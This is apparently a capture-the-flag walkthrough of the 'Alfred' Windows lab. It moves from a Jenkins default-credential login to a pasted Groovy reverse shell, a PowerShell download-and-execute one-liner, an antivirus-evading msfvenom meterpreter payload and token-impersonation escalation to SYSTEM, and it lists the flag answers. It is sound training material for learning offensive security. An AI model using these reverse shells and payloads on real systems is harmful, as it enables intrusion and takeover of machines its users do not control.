# Information

Name: Alfred

Difficulty: Easy

Description: Exploit Jenkins to gain an initial shell, then escalate your privileges by exploiting Windows authentication tokens.

## Initial Access

In this room, we'll learn how to exploit a common misconfiguration on a widely used automation server(Jenkins - This tool is used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made change to it). After which, we'll use an interesting privilege escalation method to get full system access. 

Since this is a Windows application, we'll be using `Nishang` to gain initial access. The repository contains a useful set of scripts for initial access, enumeration and privilege escalation. In this case, we'll be using the reverse shell scripts.

**How many ports are open? (TCP only)**

3

```
└─# nmap -sS 10.10.30.42 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-05 09:13 EDT
Nmap scan report for 10.10.30.42
Host is up (0.22s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 13.94 seconds
```

Checking out the website gives us some osint on emails and names. Honestly I guessed the answer when I saw *****:***** but I still need to find the actual log in page so I run a directory search on this while I go check out whats on port `8080`.

![image](https://user-images.githubusercontent.com/43668197/140515946-30cba3ae-8d06-457f-8383-837ee7517d5e.png)

**What is the username and password for the log in panel(in the format username:password)**

admin:admin

![image](https://user-images.githubusercontent.com/43668197/140519018-4261d091-3318-4ed1-8dc9-29468698f10b.png)

Port `8080` has our login page. We see the page is running Jenkins. A quick search of the default login information reveals its usually admin:password. If I had done brute forcing on the user admin I would have gotten the admin password quickly anyway.

Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port

You first need to download the Powershell script, and make it available for the server to download. You can do this by creating a http server with python: python3 -m http.server

I've had experience working with Jenkins before and know that the easiest way to get a reverse shell on it is to use the `Script Console`. You can find it under the `Manage Jenkins` menu.

Here all we have to do is google for a `groovy script`. Paste it here and change the ip and port to match our own then run the script.

```
Thread.start {
String host="10.0.0.1";
int port=53;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
}
```

![image](https://user-images.githubusercontent.com/43668197/140522032-d157d860-92f1-41e4-a4fb-d7493e934421.png)

![image](https://user-images.githubusercontent.com/43668197/140522405-28b37a00-a150-41e1-8b01-833149c2b537.png)

Alfred does not appear to have a Desktop so I tried Bruce and found the user.txt flag there.

**What is the user.txt flag? **

79007a09481963edf2e1321abd9ae2a0

##  Switching Shells

To make the privilege escalation easier, let's switch to a meterpreter shell using the following process.

Use msfvenom to create the a windows meterpreter reverse shell using the following payload

msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe

This payload generates an encoded x86-64 reverse tcp meterpreter payload. Payloads are usually encoded to ensure that they are transmitted correctly, and also to evade anti-virus products. An anti-virus product may not recognise the payload and won't flag it as malicious.

After creating this payload, download it to the machine using the same method in the previous step:

powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"

Before running this program, ensure the handler is set up in metasploit:

use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-ip set LPORT listening-port run

﻿This step uses the metasploit handler to receive the incoming connection from you reverse shell. Once this is running, enter this command to start the reverse shell

Start-Process "shell-name.exe"

This should spawn a meterpreter shell for you!
  
```
  └─# msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.13.29.43 LPORT=1234 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe
```
  
**What is the final size of the exe payload that you generated?**
  
  73802

## Privilege Escalation
  
  Now that we have initial access, let's use token impersonation to gain system access.

Windows uses tokens to ensure that accounts have the right privileges to carry out particular actions. Account tokens are assigned to an account when users log in or are authenticated. This is usually done by LSASS.exe(think of this as an authentication process).

This access token consists of:

user SIDs(security identifier)
group SIDs
privileges
amongst other things. More detailed information can be found here.

There are two types of access tokens:

primary access tokens: those associated with a user account that are generated on log on
impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process
For an impersonation token, there are different levels:

SecurityAnonymous: current user/client cannot impersonate another user/client
SecurityIdentification: current user/client can get the identity and privileges of a client, but cannot impersonate the client
SecurityImpersonation: current user/client can impersonate the client's security context on the local system
SecurityDelegation: current user/client can impersonate the client's security context on a remote system
where the security context is a data structure that contains users' relevant security information.

The privileges of an account(which are either given to the account when created or inherited from a group) allow a user to carry out particular actions. Here are the most commonly abused privileges:

SeImpersonatePrivilege
SeAssignPrimaryPrivilege
SeTcbPrivilege
SeBackupPrivilege
SeRestorePrivilege
SeCreateTokenPrivilege
SeLoadDriverPrivilege
SeTakeOwnershipPrivilege
SeDebugPrivilege
There's more reading here.

**View all the privileges using whoami /priv**
  
![image](https://user-images.githubusercontent.com/43668197/140524082-650f4fc3-8973-49e0-ab5c-cefb2f7309e6.png)


You can see that two privileges(SeDebugPrivilege, SeImpersonatePrivilege) are enabled. Let's use the incognito module that will allow us to exploit this vulnerability. Enter: load incognito to load the incognito module in metasploit. Please note, you may need to use the use incognito command if the previous command doesn't work. Also ensure that your metasploit is up to date.
  
![image](https://user-images.githubusercontent.com/43668197/140524430-5102191d-254b-4bda-8396-30cda76da99b.png)


To check which tokens are available, enter the list_tokens -g. We can see that the BUILTIN\Administrators token is available. Use the impersonate_token "BUILTIN\Administrators" command to impersonate the Administrators token.
 
![image](https://user-images.githubusercontent.com/43668197/140524597-849bb2c1-6a5d-4087-8f2d-b42616c9b487.png)

![image](https://user-images.githubusercontent.com/43668197/140524778-d1779399-b885-4808-990c-3b4899b63b42.png)

**What is the output when you run the getuid command?**
  
NT AUTHORITY\SYSTEM


Even though you have a higher privileged token you may not actually have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do). Ensure that you migrate to a process with correct permissions (above questions answer). The safest process to pick is the services.exe process. First use the ps command to view processes and find the PID of the services.exe process. Migrate to this process using the command migrate PID-OF-PROCESS
  
![image](https://user-images.githubusercontent.com/43668197/140525023-10db3102-df15-4f3b-97df-8247339883fb.png)

![image](https://user-images.githubusercontent.com/43668197/140525123-7e8c2ec4-9ee9-4647-bad6-9f25cf418e93.png)

![image](https://user-images.githubusercontent.com/43668197/140525224-c8e72c93-b3cd-4048-bc80-c72afcdffe2c.png)


**read the root.txt file at C:\Windows\System32\config**
  
dff0f748678f280250f25a45b8046b4a
